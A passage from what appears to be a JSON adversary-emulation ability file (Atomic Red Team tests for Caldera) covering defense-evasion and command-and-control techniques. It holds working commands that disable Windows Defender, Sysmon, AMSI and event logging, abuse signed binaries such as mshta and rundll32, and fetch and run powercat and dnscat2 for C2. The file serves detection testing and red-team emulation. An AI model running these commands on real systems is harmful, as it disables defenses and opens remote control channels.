                    "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "392e12d6a466407e28d1bb51cf0729bb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a63829ae9961fc5e2d424d15191b4e00": {
        "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a63829ae9961fc5e2d424d15191b4e00",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "32047c4f30d4e65ebc9b22b9b8368bca": {
        "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-MpPreference -drtm 0; Set-MpPreference -dbm 0; Set-MpPreference -dscrptsc 0; Set-MpPreference -dbaf 0",
                    "command": "Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "32047c4f30d4e65ebc9b22b9b8368bca",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5bb5d966b1e7e3d24560b4381dc4ab9c": {
        "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5bb5d966b1e7e3d24560b4381dc4ab9c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "daec5455d580c39b8d2c00eaa9d645b7": {
        "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "daec5455d580c39b8d2c00eaa9d645b7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "95efe235d7d28a8a7f0c412ffbc4f256": {
        "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "95efe235d7d28a8a7f0c412ffbc4f256",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "009c5478a4d1c426c054b7db82368597": {
        "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.010",
            "name": "Signed Binary Proxy Execution: Regsvr32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "C:\\Windows\\system32\\regsvr32.exe /U /s %temp%\\shell32.jpg",
                    "command": "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "009c5478a4d1c426c054b7db82368597",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "561ab04df1b969fcef4ea2e7177a9181": {
        "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe ieadvpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,",
                    "payloads": [
                        "80d0e0_T1218.011.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "561ab04df1b969fcef4ea2e7177a9181",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8725359f7529791717634d8fdd8948e6": {
        "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /f >nul 2>&1",
                    "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /t REG_DWORD /d 0 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8725359f7529791717634d8fdd8948e6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b7f89af9214876eae185527350ca034f": {
        "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore",
                    "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7f89af9214876eae185527350ca034f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2c3273bf48bee86bcf9305d9c63bf36e": {
        "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2c3273bf48bee86bcf9305d9c63bf36e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "04e8d83e7badf098d50800d6aa1dd487": {
        "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore",
                    "command": "copy $env:ComSpec ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "04e8d83e7badf098d50800d6aa1dd487",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "abf12d5addc3695bc1009b750e301c8b": {
        "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1140",
            "name": "Deobfuscate/Decode Files or Information"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\tcm.tmp >nul 2>&1 && del %temp%\\T1140_calc2.txt >nul 2>&1 && del %temp%\\T1140_calc2_decoded.exe >nul 2>&1",
                    "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp && %temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt && %temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "abf12d5addc3695bc1009b750e301c8b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6edbb64c4badd39db25498943b515b7f": {
        "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "echo \"Sorry you have to reboot\"",
                    "command": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6edbb64c4badd39db25498943b515b7f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2e5d4b9113d64d1d63292f95bfa4824e": {
        "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "rundll32.exe be0315_AllTheThingsx64.dll,#2",
                    "payloads": [
                        "be0315_AllTheThingsx64.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2e5d4b9113d64d1d63292f95bfa4824e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "19cc7bd7b3019bc8c28a43016c922203": {
        "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "19cc7bd7b3019bc8c28a43016c922203",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1d2516dda76448a12a74a392d4d72ec8": {
        "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1d2516dda76448a12a74a392d4d72ec8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ec8d7a83a6728d8095ef6e4a85a5eb37": {
        "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1202",
            "name": "Indirect Command Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "conhost.exe \"notepad.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ec8d7a83a6728d8095ef6e4a85a5eb37",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "afae914d4839d5194835d8475604e7b8": {
        "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "afae914d4839d5194835d8475604e7b8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "acf9655930740f886c06b45d59595619": {
        "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedExts= \".exe\"; Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore",
                    "command": "$excludedExts= \".exe\"; Add-MpPreference -ExclusionExtension  $excludedExts",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "acf9655930740f886c06b45d59595619",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ebc7b090948e5da99972d3d49c2d2a52": {
        "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}",
                    "command": "Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse;   Try {cmd /c $env:temp\\AdvancedRun.exe /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ebc7b090948e5da99972d3d49c2d2a52",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fa93e59e1418d91ce03418913ca80fa7": {
        "description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f && reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f",
                    "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fa93e59e1418d91ce03418913ca80fa7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c8f5864f2143390d743e4bf99a39930c": {
        "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c8f5864f2143390d743e4bf99a39930c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "530b4b56ce1798be0c0fc611ef5247e5": {
        "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sysmon -i -accepteula >nul 2>&1",
                    "command": "sysmon -u",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "530b4b56ce1798be0c0fc611ef5247e5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e5c77d3f6febbeb1a9291a86089bbf87": {
        "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); powercat -c",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e5c77d3f6febbeb1a9291a86089bbf87",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ae17973a4ce815dfed6935308599f05c": {
        "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.001",
            "name": "Application Layer Protocol: Web Protocols"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae17973a4ce815dfed6935308599f05c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c771bc0a37e6b332cd1dac6a410144eb": {
        "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c771bc0a37e6b332cd1dac6a410144eb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "24c3b7b004401d839a5c337201da3484": {
        "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.001",
            "name": "Application Layer Protocol: Web Protocols"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "24c3b7b004401d839a5c337201da3484",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0e434b93316b48229384c299c0ec9667": {
        "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      ; Stop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCService\" -force -erroraction silentlycontinue",
                    "command": "Start-Process $env:temp\\RemotePC.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0e434b93316b48229384c299c0ec9667",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f6946b4e5a258b48b986d3d6551f511f": {
        "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.003",
            "name": "Proxy: Multi-hop Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore; if($null -ne $Proxy) ; {Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}",
                    "command": "cfb85f_Psiphon.bat",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "cfb85f_Psiphon.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f6946b4e5a258b48b986d3d6551f511f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0dd1e1d2b1c626c431f486861904b069": {
        "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
